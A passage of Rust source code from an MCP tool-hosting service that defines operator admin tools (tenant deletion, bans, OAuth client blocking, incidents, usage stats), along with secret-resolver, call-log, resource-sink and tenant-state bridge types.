             own host.calls.export returns (csv, rows, sha256, signature, kid, alg). Audited.",
            schema(
                json!({
                    "tenant": {"type": "string", "description": "The tenant's namespace."},
                    "since": {"type": ["string", "integer"], "description": "Window start: \"-24h\", YYYY-MM-DD, an RFC 3339 instant or Unix epoch seconds (default -24h)."},
                    "until": {"type": ["string", "integer"], "description": "Window end, same forms (default now)."},
                }),
                &["tenant"],
            ),
        ),
        Tool::new(
            "admin.tenant_enable",
            "Re-enable a disabled tenant.",
            schema(json!({"tenant": {"type": "string"}}), &["tenant"]),
        ),
        Tool::new(
            "admin.tenant_delete",
            "Delete a tenant and, in the same transaction, cascade-remove every row it \
             owns (tools, secrets, calls, logs, registry document).",
            schema(json!({"tenant": {"type": "string"}}), &["tenant"]),
        ),
        Tool::new(
            "admin.tenant_delete_by_prefix",
            "Cascade-delete (or, by default, dry-run preview) every tenant whose display \
             name starts with `prefix` (at least 4 characters), up to 500 per call.",
            schema(
                json!({
                    "prefix": {"type": "string"},
                    "dry_run": {"type": "boolean"},
                }),
                &["prefix"],
            ),
        ),
        Tool::new(
            "admin.usage",
            "Calls, errors and duration percentiles for every tenant and tool over a window, \
             plus database size (db_bytes, db_page_free_bytes, rows_by_table) and the most \
             recent retention prune (last_prune).",
            schema(json!({"window": {"type": "string"}}), &[]),
        ),
        // PRD-mcphost-shared-tool-caller-usage requirement 4 (AC9): the
        // operator's heaviest-tools/heaviest-tenants view, host-wide.
        Tool::new(
            "admin.usage.top",
            "The heaviest tools or tenants on the whole host over a window, ranked by call \
             count (descending). Audited to admin_audit.",
            schema(
                json!({
                    "window": {"type": "string", "description": "e.g. \"1d\"; default 1d."},
                    "by": {"type": "string", "enum": crate::admin::USAGE_TOP_BY, "description": "\"tool\" (default) or \"tenant\"."},
                    "limit": {"type": "integer", "description": "Max rows; default 20."},
                }),
                &[],
            ),
        ),
        Tool::new(
            "admin.prune_now",
            "Run one retention-prune cycle immediately (the same cycle the nightly scheduler \
             runs) and return its per-table deleted counts.",
            schema(json!({}), &[]),
        ),
        Tool::new(
            "admin.db.stats",
            "SQLite contention counters (busy_total, locked_total, wait_gt100ms_total, \
             wait_max_ms) and pragmas in force (busy_timeout, journal_mode, synchronous, \
             foreign_keys) per connection role, plus wal_bytes, page_count, and \
             last_checkpoint.",
            schema(json!({}), &[]),
        ),
        Tool::new(
            "admin.dependency_reaudit",
            "Run one dependency-advisory re-audit cycle immediately (the same cycle the daily \
             scheduler runs) against every currently-published python tool's stored lock, and \
             return how many were newly flagged.",
            schema(json!({}), &[]),
        ),
        Tool::new(
            "admin.tool_list",
            "List a specific tenant's published tools.",
            schema(json!({"tenant": {"type": "string"}}), &["tenant"]),
        ),
        Tool::new(
            "admin.tenant_verify_namespace",
            "Mark a tenant's domain namespace verified for registry publishing \
             (the verification METHOD is operator-determined, out of scope here).",
            schema(
                json!({
                    "tenant": {"type": "string"},
                    "domain_namespace": {"type": "string"},
                }),
                &["tenant", "domain_namespace"],
            ),
        ),
        Tool::new(
            "admin.tenant_verify_owner",
            "Mark a tenant's owner verified without an inbox (method \"admin\"): sets owner_email, \
             owner_verified_at and owner_method in the single-winner UPDATE every verification path \
             shares, and appends a claim.admin audit row naming the admin key. A tenant already \
             verified by email, github or dns is refused with owner_verified_by_other_method.",
            schema(
                json!({
                    "tenant": {"type": "string"},
                    "email": {"type": "string", "description": "The owner address to record; never mailed."},
                }),
                &["tenant", "email"],
            ),
        ),
        Tool::new(
            "admin.sandbox_recheck",
            "Re-run the sandbox self-test immediately (rather than waiting for the periodic \
             recheck) and return the fresh SandboxStatus -- call after fixing whatever made \
             sandbox_ready false on /healthz, to confirm without restarting the unit.",
            schema(json!({}), &[]),
        ),
        Tool::new(
            "admin.billing_ledger",
            "Every ledgered billing event (webhook or admin.plan_set), newest first, capped \
             at 1000, optionally filtered by since/until (unix seconds) and tenant.",
            schema(
                json!({
                    "since": {"type": "integer"},
                    "until": {"type": "integer"},
                    "tenant": {"type": "string"},
                }),
                &[],
            ),
        ),
        Tool::new(
            "admin.upgrades",
            "Every checkout started in the trailing days (default 7), with its source, \
             state (completed/expired/pending), and time_to_completion_s once completed -- \
             newest-started first.",
            schema(
                json!({
                    "days": {"type": "integer"},
                }),
                &[],
            ),
        ),
        // PRD-mcphost-activation-funnel requirements 3, 6: the descriptor
        // for the arm `dispatch_admin_tool` has had since that PRD; its keys
        // are the four `admin::funnel` reads.
        Tool::new(
            "admin.funnel",
            format!(
                "Activation funnel for every tenant that signed up in the trailing days (default 7): \
                 per-stage counts, shares and medians, signups and signups_human, the breakdown by \
                 source and by origin, upgrades by trigger, install-link clicks and the by-surface \
                 probe report (known-synthetic tenants excluded and counted in synthetic_excluded; \
                 each by_surface row has the keys {}), plus recipe_attempts_7d (keys {}; uses by \
                 non-synthetic tenants) and recipe_attempts_synthetic_7d. Narrow it by source_class \
                 or signup_source, or split organic from invite-born tenants with invited, which \
                 also adds the invite k-factor.",
                crate::api_contract::SURFACE_STAGE_KEYS.join(", "),
                crate::kinds::aliases::recipe_names().join(", "),
            ),
            schema(
                json!({
                    "days": {"type": "integer", "description": "Trailing signup window in days; default 7, clamped to 1..365."},
                    "source_class": {"type": "string", "description": "Count only tenants of this source class."},
                    "signup_source": {"type": "string", "description": "Count only tenants that signed up through this source."},
                    "invited": {"type": "boolean", "description": "true: only invite-born tenants; false: only organic ones; omitted: both."},
                }),
                &[],
            ),
        ),
        Tool::new(
            "admin.plan_set",
            "Support override: set a tenant's plan directly, ledgered as event_type \
             admin.plan_set.",
            schema(
                json!({
                    "tenant": {"type": "string"},
                    "plan": {"type": "string"},
                    "reason": {"type": "string"},
                }),
                &["tenant", "plan"],
            ),
        ),
        Tool::new(
            "admin.meter_status",
            "PRD-mcphost-metered-overage P1 AC11: the last ledgered `mcphost billing emit-meter` \
             batch's span, the current meter_lag, and per-tenant emitted call counts for the \
             current UTC month.",
            schema(json!({}), &[]),
        ),
        Tool::new(
            "admin.tenant_set_synthetic",
            "Set or clear (`label: null`) one tenant's `synthetic` label. `label`, when a \
             string, must match ^[a-z0-9][a-z0-9:_-]{0,63}$.",
            schema(
                json!({
                    "tenant": {"type": "string"},
                    "label": {"type": ["string", "null"], "pattern": crate::state::SYNTHETIC_LABEL_PATTERN},
                }),
                &["tenant", "label"],
            ),
        ),
        Tool::new(
            "admin.tenants_set_synthetic",
            "Bulk retro-tag: apply `label` to every tenant whose display name matches the \
             SQL LIKE pattern `name_like` (e.g. `%Chen%`). `dry_run` (default true) only \
             returns the matched tenants and count; `dry_run: false` applies the label and \
             returns the same list.",
            schema(
                json!({
                    "name_like": {"type": "string"},
                    "label": {"type": "string", "pattern": crate::state::SYNTHETIC_LABEL_PATTERN},
                    "dry_run": {"type": "boolean"},
                }),
                &["name_like", "label"],
            ),
        ),
        Tool::new(
            "admin.reclassify_fleet_ips",
            "Idempotent backfill: reclassify every signup_events/tenants/calls row still \
             `external` whose source IP matches $MCPHOST_FLEET_IPS to synthetic (source_class \
             fleet, synthetic harness:fleet-ip). No arguments. Returns row counts touched: \
             {signup_events, tenants, calls}.",
            schema(json!({}), &[]),
        ),
        Tool::new(
            "admin.audit_log",
            "Paged, newest-first view of the admin_audit log (PRD-mcphost-provenance-audit \
             requirement 4) -- every admin-bearer mutation's actor, action, target, and \
             timestamp.",
            schema(
                json!({
                    "limit": {"type": "integer"},
                    "before_id": {"type": "integer"},
                }),
                &[],
            ),
        ),
        // PRD-mcphost-sharing user story "Operator (Joe)".
        Tool::new(
            "admin.shared_tools",
            "List every currently-shared (non-private) tool across every tenant, with \
             per-day caller counts.",
            schema(json!({}), &[]),
        ),
        Tool::new(
            "admin.tool_unshare",
            "Force a tenant's shared tool back to private (AC9); the owner's own \
             host.tool_list then shows unshared_by: admin.",
            schema(
                json!({
                    "tenant": {"type": "string"},
                    "name": {"type": "string"},
                }),
                &["tenant", "name"],
            ),
        ),
        // PRD-mcphost-runs-and-jobs P0 requirement 7 (user story "Operator (Joe)").
        Tool::new(
            "admin.runs",
            format!(
                "List runs across every tenant (or one, via tenant), optionally filtered by \
                 status ({}) -- a stuck executor is visible as runs older than their deadline_s \
                 still running.",
                crate::run_enums::RunStatus::names().join("|"),
            ),
            schema_checked(
                json!({
                    "tenant": {"type": "string", "description": "Restrict to one tenant's namespace."},
                    "status": crate::run_enums::RunStatus::schema_property(),
                    "limit": {"type": "integer", "description": "Max runs to return; default 50."},
                }),
                &[],
            ),
        ),
        Tool::new(
            "admin.runs_reap",
            "Mark error: interrupted every run left running past its started_unix + \
             deadline_s with no finalization (an executor crash). Also runs once at startup.",
            schema(json!({}), &[]),
        ),
        // PRD-mcphost-schedules P0 requirement 2 (user story "Operator (Joe)").
        Tool::new(
            "admin.triggers",
            "List every tenant's triggers (or one tenant's, via tenant), optionally filtered by \
             kind, with each schedule's next fire time.",
            schema(
                json!({
                    "tenant": {"type": "string", "description": "Restrict to one tenant's namespace."},
                    "kind": {"type": "string", "description": "Only triggers of this kind."},
                }),
                &[],
            ),
        ),
        // PRD-mcphost-agent-directory P1 requirement 8: recover a squatted
        // or abusive handle.
        Tool::new(
            "admin.agent.lookup",
            "Like host.agent.lookup, but on any tenant including disabled ones.",
            schema(
                json!({
                    "address": {
                        "type": "string",
                        "description": "An @handle (e.g. \"@indexer\") or a bare namespace (t_...).",
                    },
                }),
                &["address"],
            ),
        ),
        Tool::new(
            "admin.agent.handle_release",
            "Free a handle so it can be claimed again, regardless of which tenant holds it; \
             writes one admin_events row.",
            schema(
                json!({
                    "address": {
                        "type": "string",
                        "description": "The handle to release, e.g. \"@indexer\" (with or without the @).",
                    },
                }),
                &["address"],
            ),
        ),
        // PRD-mcphost-agent-mesh-ops P0 requirements 1-5, P1 requirement 8.
        Tool::new(
            "admin.mesh.stats",
            "Message/post/contact-request/refusal volume over a window (1h, 24h, 7d), split \
             real/synthetic, with refusals_by_code per sender and the top 20 tenants by \
             message volume.",
            schema(
                json!({
                    "window": {"type": "string", "description": "\"1h\", \"24h\", or \"7d\"; default 1h."},
                    "tenant": {"type": "string", "description": "Restrict to one tenant's namespace."},
                }),
                &[],
            ),
        ),
        Tool::new(
            "admin.mesh.threads",
            "List threads and channels with participant addresses, message/post counts and \
             last_activity -- no bodies.",
            schema(
                json!({
                    "tenant": {"type": "string", "description": "Restrict threads to one participant tenant."},
                    "channel": {"type": "string", "description": "Restrict to one channel by name."},
                    "limit": {"type": "integer", "description": "Max rows per list, up to 100; default 100."},
                }),
                &[],
            ),
        ),
        Tool::new(
            "admin.mesh.thread",
            "Read one thread's or channel's messages/posts with bodies. Every call writes an \
             admin_events row (action: mesh.thread_read) -- unaudited body reads don't happen.",
            schema(
                json!({
                    "thread_or_channel_id": {"type": "string", "description": "A thread id or a channel id/name."},
                    "limit": {"type": "integer", "description": "Max rows, up to 100; default 50."},
                    "cursor": {"type": "string", "description": "Opaque; resume after a previous response's next_cursor."},
                    "reason": {"type": "string", "description": "Optional; recorded on the admin_events row."},
                }),
                &["thread_or_channel_id"],
            ),
        ),
        Tool::new(
            "admin.mesh.freeze",
            "Stop a tenant's host.msg.send/reply, host.channel.post and \
             host.agent.contact_request (each then returns mesh_frozen); its tools, key, reads \
             and inbound delivery are unaffected. Writes one admin_events row.",
            schema(
                json!({
                    "tenant": {"type": "string"},
                    "reason": {"type": "string"},
                }),
                &["tenant", "reason"],
            ),
        ),
        Tool::new(
            "admin.mesh.unfreeze",
            "Clear a tenant's mesh freeze. Writes one admin_events row.",
            schema(json!({"tenant": {"type": "string"}}), &["tenant"]),
        ),
        Tool::new(
            "admin.mesh.purge",
            "Delete messages and channel posts (and their receipts) older than \
             older_than_days, clamping channel cursors to the first retained seq. dry_run \
             (default true) only reports counts.",
            schema(
                json!({
                    "older_than_days": {"type": "integer", "minimum": 1},
                    "dry_run": {"type": "boolean"},
                }),
                &["older_than_days"],
            ),
        ),
        // PRD-mcphost-abuse-guard-ban-list requirement 3.
        Tool::new(
            "admin.ban.add",
            "Ban a subject (a tenant key, a source address, or a claim email domain): refuses \
             signup/tool calls/claim routes/inbound hooks from it with error `banned`. Exactly \
             one of `ttl` (\"30m\", \"24h\", \"7d\") or the literal `permanent: true` is \
             required. `public: true` includes `reason` in the caller-visible refusal; \
             otherwise it never does.",
            schema(
                json!({
                    "subject_kind": {"type": "string", "enum": crate::admin::BAN_SUBJECT_KINDS},
                    "subject": {
                        "type": "string",
                        "description": "The raw tenant key, a literal address, or an email domain.",
                    },
                    "ttl": {"type": "string", "description": "e.g. \"30m\", \"24h\", \"7d\"."},
                    "permanent": {"type": ANY_JSON_TYPES, "description": "Only the literal boolean true counts; any other value is treated as absent (then ttl is required)."},
                    "reason": {"type": "string"},
                    "public": {"type": "boolean", "description": "Include reason in the refusal; default false."},
                }),
                &["subject_kind", "subject", "reason"],
            ),
        ),
        Tool::new(
            "admin.ban.remove",
            "Remove a ban by id; the subject is unbanned on its very next request. The ban \
             stays in admin.ban.list's history (stamped removed_at) until the 7-day sweep.",
            schema(json!({"id": {"type": "integer"}}), &["id"]),
        ),
        Tool::new(
            "admin.ban.list",
            "List bans, newest first, each with hits/reason/expires_at/auto plus \
             removed_at/active. `active_only` (default false) narrows to the bans still \
             enforcing; the default is the full history, including bans that expired or were \
             removed by admin.ban.remove. `subject_kind` restricts to one kind.",
            schema(
                json!({
                    "active_only": {"type": "boolean"},
                    "subject_kind": {"type": "string", "enum": crate::admin::BAN_SUBJECT_KINDS},
                }),
                &[],
            ),
        ),
        // PRD-mcphost-oauth-resource-server P1 requirement 6, AC9.
        Tool::new(
            "admin.oauth.issuers",
            "List every registered OAuth issuer across every tenant, with the owning tenant's \
             namespace, JWKS fetch age, and per-reason rejection counters.",
            schema(json!({}), &[]),
        ),
        Tool::new(
            "admin.oauth.issuer_remove",
            "Remove one tenant's registered OAuth issuer (for example an invalid row the \
             discovery documents already omit). Writes an audit row carrying the reason; an \
             absent issuer returns issuer_not_found. Returns {removed: true, issuer}.",
            schema(
                json!({
                    "tenant_id": {"type": "integer", "description": "The owning tenant's id (host.doctor's oauth_issuers.invalid[].tenant_id)."},
                    "issuer": {"type": "string"},
                    "reason": {"type": "string", "minLength": 1, "description": "Why; stored in the tenant's audit row."},
                }),
                &["tenant_id", "issuer", "reason"],
            ),
        ),
        Tool::new(
            "admin.oauth.jwks_refresh",
            "Force an immediate JWKS refetch for one issuer, bypassing the normal TTL and \
             unknown-kid throttle.",
            schema(json!({"issuer": {"type": "string"}}), &["issuer"]),
        ),
        // PRD-mcphost-oauth-client-policy requirement 5 (AC7/AC8): the
        // operator's global block list, checked ahead of any tenant's own
        // policy at every tenant's /oauth/register, /oauth/authorize and
        // /oauth/token.
        Tool::new(
            "admin.oauth.client_block",
            "Block a client (by exact client_id) or every client from a CIMD host, across every \
             tenant: register/authorize/exchange all refuse client_blocked from then on.",
            schema_any(
                json!({
                    "client_id": {"type": "string"},
                    "cimd_host": {"type": "string"},
                    "reason": {"type": "string"},
                }),
                &[],
                &["client_id", "cimd_host"],
            ),
        ),
        Tool::new(
            "admin.oauth.client_unblock",
            "Remove a prior admin.oauth.client_block entry (exact client_id or cimd_host match).",
            schema_any(
                json!({"client_id": {"type": "string"}, "cimd_host": {"type": "string"}}),
                &[],
                &["client_id", "cimd_host"],
            ),
        ),
        Tool::new(
            "admin.oauth.blocked",
            "List every entry on the operator's global OAuth client block list.",
            schema(json!({}), &[]),
        ),
        // PRD-mcphost-tool-scopes-and-consent requirement 6 (AC8) extends
        // this PRD-mcphost-oauth-client-policy tool with consents_by_scope_7d
        // rather than minting a second admin.oauth.stats.
        Tool::new(
            "admin.oauth.stats",
            "Counts for the operator's global OAuth block list: total blocks, and how many \
             attempts each block-triggered refusal reason has cost across every tenant; plus \
             consents_by_scope_7d, a count of every space-separated scope word across every \
             grant created in the last 7 days (a read+write consent counts once toward each).",
            schema(json!({}), &[]),
        ),
        // PRD-mcphost-oauth-demand-signal requirement 3 (AC3/AC4). Named
        // `demand_stats`, not `stats`, to avoid colliding with
        // PRD-mcphost-oauth-client-policy's own `admin.oauth.stats` (the
        // block-list counters above), which landed first.
        Tool::new(
            "admin.oauth.demand_stats",
            "The OAuth demand signal: calls and distinct non-synthetic tenants per credential \
             method (key/issuer_jwt/hosted_token) over 7 and 30 days, DCR/CIMD client counts, \
             active grants, first-ever issuer_jwt/hosted_token call timestamps, a per-tenant \
             breakdown (non-synthetic tenants first), and the registration/consent/token funnel.",
            schema(json!({}), &[]),
        ),
        // PRD-mcphost-enterprise-managed-auth requirement 4 (AC3): every
        // trusted identity-assertion issuer across every tenant, with
        // per-reason assertion-rejection counters -- the audit surface
        // AC3 reads.
        Tool::new(
            "admin.oauth.trusted_issuers",
            "List every trusted identity-assertion issuer across every tenant, with the owning \
             tenant's namespace, client_id, audience, and per-reason assertion-rejection counters \
             (untrusted_issuer, bad_signature, wrong_audience, expired, replay, subject_revoked).",
            schema(json!({}), &[]),
        ),
        // PRD-mcphost-alerting-webhook requirement 5.
        Tool::new(
            "admin.alerts.list",
            "List raised alerts, newest first, each with delivery_status/repeat_count/acked \
             state. `unacked_only: true` narrows to alerts not yet acknowledged; `since` \
             (unix seconds) narrows to alerts raised at or after it; `limit` defaults to 100.",
            schema(
                json!({
                    "limit": {"type": "integer"},
                    "since": {"type": "integer"},
                    "unacked_only": {"type": "boolean"},
                }),
                &[],
            ),
        ),
        // PRD-mcphost-example-from-published-tool R4/R7.
        Tool::new(
            "admin.example_proposals",
            "Review tenant example proposals (host.example.propose). action list shows them \
             (status narrows; id returns one with its rendered files), approve/reject decide a \
             pending one, record decided_by and tell the proposer by inbox message; merge (used by \
             `mcphost examples proposals pull`) marks an approved one merged with its pr_url.",
            schema(
                json!({
                    "action": {"type": "string", "enum": crate::admin::PROPOSAL_ACTIONS},
                    "id": {"type": "integer"},
                    "reason": {"type": "string"},
                    "pr_url": {"type": "string"},
                    "status": {"type": "string", "enum": crate::admin::PROPOSAL_STATUSES},
                }),
                &["action"],
            ),
        ),
        // PRD-mcphost-example-proof-nightly-and-hide R2/R9.
        Tool::new(
            "admin.example_proof_report",
            "Record one example's nightly proof verdict (posted by `mcphost examples prove --report`). \
             ok false hides the example from host.example.list and host.example.fork; ok true clears it.",
            schema(
                json!({
                    "name": {"type": "string", "description": "An embedded example name."},
                    "ok": {"type": "boolean"},
                    "duration_s": {"type": "number"},
                    "log_excerpt": {"type": "string", "description": "Last lines of the proof's output."},
                    "runner": {"type": "string"},
                    "at": {"type": "integer", "description": "Unix seconds the proof ran; default now."},
                }),
                &["name", "ok"],
            ),
        ),
        Tool::new(
            "admin.alerts.ack",
            "Acknowledge one alert by id -- appears in admin_audit under the operator identity.",
            schema(json!({"id": {"type": "integer"}}), &["id"]),
        ),
        Tool::new(
            "admin.alerts.raise",
            "Raise an alert from outside the host (e.g. mcphost-deploy's backup.failed) through \
             the same store/deliver/cooldown path as every built-in source. `body` is capped at \
             16 KiB.",
            schema(
                json!({
                    "key": {"type": "string"},
                    "severity": {"type": "string", "enum": crate::alerts::SEVERITIES},
                    "title": {"type": "string"},
                    "body": {"type": "object"},
                }),
                &["key", "severity", "title"],
            ),
        ),
        // PRD-mcphost-status-feed requirement 4.
        Tool::new(
            "admin.incident.open",
            "Open an incident naming one or more components. impact: \"major\" drives \
             /status.json's overall state to outage; \"partial\" to degraded; \"minor\" leaves \
             it operational. Appears in incidents_open until admin.incident.close.",
            schema(
                json!({
                    "title": {"type": "string"},
                    "impact": {"type": "string", "enum": crate::admin::INCIDENT_IMPACTS},
                    "components": {"type": "array", "items": {"type": "string"}},
                }),
                &["title", "impact", "components"],
            ),
        ),
        Tool::new(
            "admin.incident.update",
            "Append one timeline entry to an open incident; the incident stays open.",
            schema(
                json!({"id": {"type": "integer"}, "message": {"type": "string"}}),
                &["id", "message"],
            ),
        ),
        Tool::new(
            "admin.incident.close",
            "Append the closing timeline entry and stamp closed_at -- the incident moves from \
             /status.json's incidents_open to incidents_recent_30d.",
            schema(
                json!({"id": {"type": "integer"}, "message": {"type": "string"}}),
                &["id", "message"],
            ),
        ),
        Tool::new(
            "admin.status.sample",
            "Post an external probe result (e.g. mcphost-deploy's outside-in reachability check) \
             into the status feed -- one status_samples row, source preserved verbatim.",
            schema(
                json!({
                    "component": {"type": "string", "enum": crate::statusfeed::COMPONENTS},
                    "ok": {"type": "boolean"},
                    "latency_ms": {"type": "integer"},
                    "source": {"type": "string"},
                }),
                &["component", "ok", "source"],
            ),
        ),
        Tool::new(
            "admin.status.rollup",
            "Recompute status_daily for every day with at least one raw sample in \
             [since, until) (unix seconds); defaults to the trailing 90-day sample-retention \
             window.",
            schema(
                json!({"since": {"type": "integer"}, "until": {"type": "integer"}}),
                &[],
            ),
        ),
        // PRD-mcphost-feedback-themes-nightly R4.
        Tool::new(
            "admin.feedback.themes",
            "List the nightly feedback themes (count, tenants, example feedback ids, last call \
             ids), count descending. since: \"24h\", \"7d\" (default) or \"30d\"; optional kind \
             and status filters. Never carries a row's text.",
            schema(
                json!({
                    "since": {"type": "string", "description": "Window: 24h, 7d (default) or 30d."},
                    "kind": {"type": "string", "enum": crate::feedback::FeedbackKind::schema_enum()},
                    "status": {"type": "string"},
                }),
                &[],
            ),
        ),
        // PRD-mcphost-upstream-token-vault-status P0 requirement 2 (AC4/AC5).
        Tool::new(
            "admin.vault.stats",
            "Cross-tenant upstream-vault usage: tokens/revoked/refresh_failures_24h per \
             provider per tenant, plus totals -- never a token, secret, or client_secret \
             substring.",
            schema(json!({}), &[]),
        ),
        // PRD-mcphost-end-user-audit-and-revoke P1 requirement 7 (AC9).
        Tool::new(
            "admin.enduser.stats",
            "Per-tenant end-user totals: active_30d, revoked, purged. Only tenants with at \
             least one end user appear.",
            schema(json!({}), &[]),
        ),
    ]
}

// ---- secret resolver / call log, bridging async DB to the sync Kind API --

struct MapSecretResolver {
    values: HashMap<String, String>,
    hosts: HashMap<String, Vec<String>>,
}
impl SecretResolver for MapSecretResolver {
    fn resolve(&self, name: &str) -> Option<String> {
        self.values.get(name).cloned()
    }

    fn bound_hosts(&self, name: &str) -> Option<Vec<String>> {
        self.hosts.get(name).cloned()
    }
}

pub(crate) async fn build_secret_resolver(
    state: &AppState,
    tenant_id: i64,
) -> Result<Arc<dyn SecretResolver>, AppError> {
    let values = build_secret_map(state, tenant_id).await?;
    secret_resolver_for(state, tenant_id, values).await
}

/// PRD-mcphost-secret-non-exfiltration-proof R1: a resolver over an
/// already-built secret map plus the tenant's host bindings.
async fn secret_resolver_for(
    state: &AppState,
    tenant_id: i64,
    values: HashMap<String, String>,
) -> Result<Arc<dyn SecretResolver>, AppError> {
    // A tenant with no secrets has no bindings: skip the SELECT, so the hot
    // path of an ordinary call (umeta_ac05) runs no query it did not before.
    let hosts = if values.is_empty() { HashMap::new() } else { state.db.secret_hosts(tenant_id).await? };
    Ok(Arc::new(MapSecretResolver { values, hosts }))
}

/// The tenant's secrets, name -> decrypted value: what
/// [`build_secret_resolver`] resolves from, and what the call-trace
/// redactor (PRD-mcphost-call-trace-replay requirement 3) scrubs by.
pub(crate) async fn build_secret_map(
    state: &AppState,
    tenant_id: i64,
) -> Result<HashMap<String, String>, AppError> {
    let names = state.db.list_secret_names(tenant_id).await?;
    let mut map = HashMap::with_capacity(names.len());
    for name in names {
        if let Some((ct, nonce)) = state.db.get_secret(tenant_id, name.clone()).await? {
            let plain = state.secrets.decrypt(&ct, &nonce)?;
            map.insert(name, plain);
        }
    }
    Ok(map)
}

pub(crate) struct BufferedLog(pub(crate) std::sync::Mutex<Vec<String>>);
impl CallLog for BufferedLog {
    fn log(&self, line: &str) {
        if let Ok(mut guard) = self.0.lock() {
            guard.push(line.to_string());
        }
    }
}

/// See `kinds::ResourceSink`: a single-slot cell a `Kind::call` (currently
/// only `python`) writes its sandboxed subprocess's CPU/memory usage into,
/// read back after the call to fill in the `calls` row (PRD-mcphost-code-tools
/// requirement 8). `None` (the default) means the kind never reported any --
/// exactly what happens for `echo`/`http`.
///
/// PRD-mcphost-sandbox-resource-limits-from-plan R4: the second slot holds
/// the call's `pids_max_seen` (`-1` until the sandbox samples it).
///
/// PRD-mcphost-sandbox-timeout-clamp-visible R6: the third slot holds the
/// limits the call ran under after the plan's clamp.
pub(crate) struct CellResourceSink(
    pub(crate) std::sync::Mutex<Option<(i64, i64)>>,
    std::sync::atomic::AtomicI64,
    std::sync::Mutex<Option<crate::kinds::EffectiveLimits>>,
);
/// PRD-mcphost-sandbox-resource-limits-from-plan R4/R5: the in-flight marker
/// key the three python-call paths leave `resources_used` under. It is taken
/// off the result object at the wire (`call_tool_inner`) and rides out as
/// `_meta.resources_used`, so a tool's own returned JSON (a bridge call's
/// host-verb JSON, `host.tool_run`'s `payload`) stays byte-for-byte what it
/// returned -- the same marker-key pattern as `paged::LIMIT_CLAMPED_KEY`.
pub(crate) use crate::envelope::RESOURCES_USED_KEY;

impl CellResourceSink {
    pub(crate) fn new() -> Self {
        Self(std::sync::Mutex::new(None), std::sync::atomic::AtomicI64::new(-1), std::sync::Mutex::new(None))
    }

    /// R4: `{cpu_ms, peak_rss_mb, wall_ms, pids_max_seen}` for the call this
    /// sink observed -- `None` when the kind never reported usage (a
    /// non-sandboxed kind). `pids_max_seen` is `null` when unsampled.
    pub(crate) fn resources_used(&self, wall_ms: i64) -> Option<Value> {
        let (cpu_ms, peak_rss_kb) = (*self.0.lock().ok()?)?;
        let pids = self.1.load(std::sync::atomic::Ordering::Relaxed);
        let mut used = json!({
            "cpu_ms": cpu_ms,
            "peak_rss_mb": (peak_rss_kb.max(0) + 1023) / 1024,
            "wall_ms": wall_ms,
            "pids_max_seen": (pids >= 0).then_some(pids),
        });
        if let Some(limits) = self.2.lock().ok().and_then(|g| g.clone()) {
            used["timeout_s_effective"] = json!(limits.timeout_s_effective);
            used["clamped"] = json!(limits.clamped);
        }
        Some(used)
    }

    /// R6: `{timeout_s_requested, timeout_s_effective, wall_s, clamped}` for
    /// `call_traces.timings_json` -- `None` when no limits were recorded.
    pub(crate) fn limits_json(&self) -> Option<Value> {
        let limits = self.2.lock().ok()?.clone()?;
        Some(json!({
            "timeout_s_requested": limits.timeout_s_requested,
            "timeout_s_effective": limits.timeout_s_effective,
            "wall_s": limits.wall_s,
            "clamped": limits.clamped,
        }))
    }
}
impl ResourceSink for CellResourceSink {
    fn record(&self, cpu_ms: i64, peak_rss_kb: i64) {
        if let Ok(mut guard) = self.0.lock() {
            *guard = Some((cpu_ms, peak_rss_kb));
        }
    }

    fn record_pids(&self, pids_max_seen: i64) {
        self.1.store(pids_max_seen, std::sync::atomic::Ordering::Relaxed);
    }

    fn record_limits(&self, limits: &crate::kinds::EffectiveLimits) {
        if let Ok(mut guard) = self.2.lock() {
            *guard = Some(limits.clone());
        }
    }
}

/// `tenant_state.rs`'s own errors are always `AppError::Structured`,
/// `InvalidArgs`, or `InvalidSpec` (see its `arg_str`/`quota_exceeded`/
/// `schema_violation`/`table_not_found` helpers); those three round-trip
/// their fields unchanged into the matching `KindError` variant. Anything
/// else becomes an `Exec` carrying the message -- the same fallback shape
/// `From<KindError> for AppError` uses in the other direction.
pub(crate) fn app_error_to_kind_error(e: AppError) -> KindError {
    match e {
        AppError::Structured {
            code,
            message,
            data,
        } => KindError::Structured {
            code,
            message,
            data,
        },
        AppError::InvalidArgs(m) => KindError::InvalidArgs(m),
        AppError::InvalidSpec(m) => KindError::InvalidSpec(m),
        other => KindError::Exec(other.to_string()),
    }
}

/// PRD-mcphost-tenant-state requirement 3: bridges `Kind::call`'s
/// `CallCtx.state` to the real `tenant_state.rs` business logic for this
/// call's own tenant -- the same pattern `build_secret_resolver` uses for
/// `CallCtx.secrets`. `op` is one of the bare verb names `kinds::python`'s
/// `mcphost.state` sandbox module sends (`"get"`, `"set"`, `"delete"`,
/// `"list"`, `"table_create"`, `"table_drop"`, `"insert"`, `"query"`,
/// `"delete_rows"`) -- distinct from the dotted `host.state.*` tool names
/// `dispatch_control_tool` matches above, which is the *other* caller of
/// these same `tenant_state::state_*` functions.
pub(crate) struct TenantStateBridge {
    pub(crate) state: Arc<AppState>,
    pub(crate) tenant: Tenant,
    /// PRD-mcphost-end-user-identity requirement 5: this call's own end
    /// user (if any) -- threaded into every `tenant_state::state_*` op
    /// below exactly like `dispatch_control_tool`'s direct `host.state.*`
    /// dispatch does, so `mcphost.state`'s `end_user` argument resolves
    /// identically whether a tool reaches it from inside a python sandbox
    /// or a caller reaches it directly.
    pub(crate) end_user: Option<crate::enduser::EndUser>,
    /// PRD-mcphost-dry-run-side-effects requirement 3: `Some` only for
    /// `host.tool_test`/`host.tool_run(test: true)`'s own construction of
    /// this bridge -- every successful write op below is additionally
    /// reported into it as a `dry_run.writes` entry. `None` for the real
    /// dispatch path and `host.spec_test` (out of this PRD's tested scope).
    pub(crate) dry_run: Option<Arc<crate::dryrun::DryRunCtx>>,
}

#[async_trait::async_trait]
impl StateBackend for TenantStateBridge {
    async fn call(&self, op: &str, args: Value) -> Result<Value, KindError> {
        let eu = self.end_user.as_ref();
        let result = match op {
            "get" => tenant_state::state_get(&self.state, &self.tenant, &args, eu).await,
            "set" => tenant_state::state_set(&self.state, &self.tenant, &args, eu).await,
            "delete" => tenant_state::state_delete(&self.state, &self.tenant, &args, eu).await,
            "list" => tenant_state::state_list(&self.state, &self.tenant, &args, eu).await,
            "table_create" => {
                tenant_state::state_table_create(&self.state, &self.tenant, &args).await
            }
            "table_drop" => tenant_state::state_table_drop(&self.state, &self.tenant, &args).await,
            "insert" => tenant_state::state_insert(&self.state, &self.tenant, &args, eu).await,
            "query" => tenant_state::state_query(&self.state, &self.tenant, &args, eu).await,
            "delete_rows" => {
